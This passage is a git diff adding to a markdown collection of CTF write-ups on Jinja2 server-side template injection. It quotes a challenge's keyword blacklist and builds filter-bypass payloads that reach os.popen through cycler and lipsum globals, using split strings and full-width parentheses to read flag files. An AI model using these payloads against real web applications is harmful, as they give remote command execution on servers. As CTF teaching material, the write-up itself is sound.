@@ -75,3 +75,26 @@ Connection: close
   In this challenge, parenthesis were blacklistyed which means that any python command could not be executed. The way around this was to use full width parenthesis intead of half width which would serve the purpose and all bypass the filter.
  Final payload:```"{{ self._TemplateReferencecontext.cycler.init.globals__.os.popen（'cat flag.txt'）.read（）}}"@aaa.com```
 This payload was inserted into the email field and flag was obtained
+
+- ## Crewctf 2022 (Ezchall):
+  Blocks:
+  ```if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 :```
+limited payload size: ```if len(input) < 115```
+can’t use digits so we can’t bypass the blacklist with Unicode.
+```
+if char in string.digits:
+	return False
+```
+Finally, the blacklist.
+```UNALLOWED = [
+ 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']
+```
+
+Approach:
+  - {{ and }} are filtered, so we’ll probably use {%
+  - cycler.__init__.__globals__.os.popen('id').read()
+  - to make it easier to deal with blacklisted words and also the count of dots,changed it to this format: ```cycler['__init__']['__globals__']['os']['popen']('id')['read']()```
+  - we need to us an empty space between the blacklisted strings: ```cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()```
+  - The only problem here, is that we’re exceeding the length limit. Solution was using lipsum.: ```lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()```
+
+- ##
